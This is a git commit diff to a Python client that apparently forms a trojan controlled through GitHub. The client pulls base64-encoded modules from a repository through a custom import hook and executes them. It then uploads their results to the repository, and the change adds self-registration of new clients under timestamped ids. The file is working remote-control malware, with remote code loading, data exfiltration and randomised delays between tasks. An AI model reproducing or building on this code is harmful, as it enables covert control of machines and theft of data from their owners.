76addb4994a9de29c9a903b18a5e2dfd2b78bb8f
JochiRaider <87738004+JochiRaider@users.noreply.github.com>
2021-12-23 21:19:09 -0500

    Update client_example.py

--- client_example.py
+++ client_example.py
@@ -12,9 +12,9 @@ import queue
 from datetime import datetime
 from github3 import login
 
-client_id = "abc"
+client_id = None
 
-configured = False
+
 task_queue = queue.Queue()
 
 class GitImporter(object):
@@ -22,12 +22,11 @@ class GitImporter(object):
         self.current_module_code = ""
     
     def find_module(self, fullname, path=None):
-        if configured:
-            print(f" [**] Attempting to retrieve {fullname}")
-            new_library = get_file_contents(f"modules/{fullname}")         
-            if new_library:
-                self.current_module_code = base64.b64decode(new_library)        
-                return self
+        print(f"[**] Attempting to retrieve {fullname}")
+        new_library = get_file_contents(f"modules/{fullname}")         
+        if new_library:
+            self.current_module_code = base64.b64decode(new_library)        
+            return self
 
     def load_module(self, name):
         repo = connect_to_github()
@@ -41,7 +40,7 @@ def connect_to_github():
     with open('git_stuff.txt', 'r') as t:
         git_info = eval(t.read())
     gh = login(username=git_info['user'], token=git_info['token']) 
-    repo = gh.repository( git_info['user'], git_info['repo_name'])
+    repo = gh.repository(git_info['user'], git_info['repo_name'])
     return repo
 
 
@@ -57,19 +56,19 @@ def get_file_contents(filepath):
             return blob.content
         
 def get_client_config():
-    global configured
     config_json = get_file_contents(f"config/{client_id}.json")
-    configuration = json.loads(base64.b64decode(config_json))
-    configured = True
-
+    if config_json == None:
+        configuration = [{'module':'rookie'}]
+    else:
+        configuration = json.loads(base64.b64decode(config_json))
     for tasks in configuration:
         if tasks["module"] not in sys.modules:
             exec(f"import {tasks['module']}")
     return configuration
 
-def store_module_result(data):
+def store_module_result(data, module):
     repo = connect_to_github()
-    message = datetime.now().isoformat()
+    message = f'{module}__{datetime.now().isoformat()}'
     remote_path = f"data/{client_id}/{message}.data"
     bindata = bytes('%r' %data, 'utf-8')
     repo.create_file(remote_path, message, base64.b64encode(bindata))
@@ -78,21 +77,35 @@ def module_runner(module):
     task_queue.put(1)
     result = sys.modules[module].run()
     task_queue.get()
-    store_module_result(result)
+    store_module_result(result, module)
     
+def create_client_config(module):
+    global client_id
+    client_id = f'ent-{int(time.time())}'
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+    repo = connect_to_github()
+    remote_path = f"config/{client_id}.json"
+    message = f'{client_id} init {datetime.now().isoformat()}' 
+    bindata = bytes(r'%s' %result, 'utf-8')
+    repo.create_file(remote_path, message, bindata)
 
 def main():
     sys.meta_path = [GitImporter()]
 
     while True:
         if task_queue.empty():
-            
             config = get_client_config()
-            
             for task in config:
-                t = threading.Thread(target=module_runner, args=(task['module'],))
-                t.start()
-                time.sleep(random.randint(1,10))
+                if task['module'] == 'rookie':
+                    t = threading.Thread(target=create_client_config , args=(task['module'],))
+                    t.start()
+                    time.sleep(random.randint(5,10))
+                else:
+                    t = threading.Thread(target=module_runner, args=(task['module'],))
+                    t.start()
+                    time.sleep(random.randint(5,10))
         # time.sleep(random.randint(10000, 60000))
 
 if __name__=='__main__':
